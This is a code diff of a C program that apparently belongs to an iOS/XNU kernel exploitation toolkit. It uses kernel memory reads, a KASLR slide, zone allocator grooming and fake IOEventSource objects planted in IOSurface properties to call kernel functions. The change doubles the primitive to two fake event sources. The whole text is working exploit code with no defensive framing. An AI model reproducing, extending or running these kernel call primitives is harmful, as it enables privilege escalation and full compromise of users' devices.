@@ -73,20 +73,20 @@ int main(int argc, const char* argv[]) {
     uintptr_t record_function;
     int error = gym_get_record_function_address(&record_function);
     assert(error == 0);
-    record_function = XE_UTIL_PTRAUTH_STRIP(record_function);
+    record_function = XE_PTRAUTH_STRIP(record_function);
     
     uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
-    uintptr_t proc;
-    error = xe_xnu_proc_current_proc(kernproc, &proc);
-    assert(error == 0);
+    uintptr_t proc = xe_xnu_proc_current_proc(kernproc);
     
     xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_slide(VAR_ZONE_IO_EVENT_SOURCE)), 1);
     xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_slide(VAR_KHEAP_DEFAULT_ADDR), 128), 1);
     
-    xe_util_kfunc_basic_t util = xe_util_kfunc_basic_create(proc, io_event_source_allocator, block_allocator, VAR_ZONE_ARRAY_LEN - 1);
+    xe_util_kfunc_basic_t util1 = xe_util_kfunc_basic_create(proc, io_event_source_allocator, block_allocator, VAR_ZONE_ARRAY_LEN - 1);
+    xe_util_kfunc_basic_t util2 = xe_util_kfunc_basic_create(proc, io_event_source_allocator, block_allocator, VAR_ZONE_ARRAY_LEN - 2);
     
     for (int i=0; i<10; i++) {
-        uintptr_t io_event_source = xe_util_kfunc_build_event_source(util, record_function);
+        uintptr_t io_event_source1 = xe_util_kfunc_build_event_source(util1, record_function);
+        uintptr_t io_event_source2 = xe_util_kfunc_build_event_source(util2, record_function);
         
         iokit_iosurface_allocator_t allocator;
         error = iokit_iosurface_allocator_create(&allocator);
@@ -95,16 +95,21 @@ int main(int argc, const char* argv[]) {
         size_t alloc_idx;
         error = iokit_iosurface_allocator_allocate(allocator, 64, 1, &alloc_idx);
         assert(error == 0);
+        error = iokit_iosurface_allocator_allocate(allocator, 64, 1, &alloc_idx);
+        assert(error == 0);
         
         uintptr_t surface;
-        error = xe_io_surface_scan_all_clients_for_prop("iosurface_alloc_0", &surface);
+        error = xe_io_surface_scan_all_clients_for_prop("iosurface_alloc_1", &surface);
         assert(error == 0);
         
         uintptr_t props = xe_kmem_read_uint64(KMEM_OFFSET(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET));
-        xe_io_os_dictionary_set_value_of_key(props, "iosurface_alloc_0", io_event_source);
+        error = xe_io_os_dictionary_set_value_of_key(props, "iosurface_alloc_0", io_event_source1);
+        assert(error == 0);
+        error = xe_io_os_dictionary_set_value_of_key(props, "iosurface_alloc_1", io_event_source2);
+        assert(error == 0);
         
         iokit_iosurface_allocator_destroy(&allocator);
-        printf("%d\n", i);
-        xe_util_kfunc_reset(util);
+        xe_util_kfunc_reset(util1);
+        xe_util_kfunc_reset(util2);
     }
 }
